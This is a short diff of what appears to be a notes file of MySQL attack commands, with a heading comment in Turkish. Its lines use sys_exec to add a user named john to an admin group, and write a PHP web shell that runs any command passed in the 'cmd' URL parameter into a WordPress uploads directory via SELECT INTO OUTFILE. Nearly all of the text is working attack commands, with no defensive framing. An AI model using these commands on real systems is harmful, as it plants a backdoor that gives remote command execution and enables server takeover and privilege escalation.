@@ -21,8 +21,8 @@ mysql> select sys_exec('usermod -a -G admin john');
 mysql> exit
 
 
-OTHER 
-=====
+OTHER " shell.php içerisine <?php echo shell_exec($_GET['cmd']);?> satırını ekliyor "
+=====================================================================================
 
 mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/xxxx/xxxx/wp-content/uploads/shell.php";
 
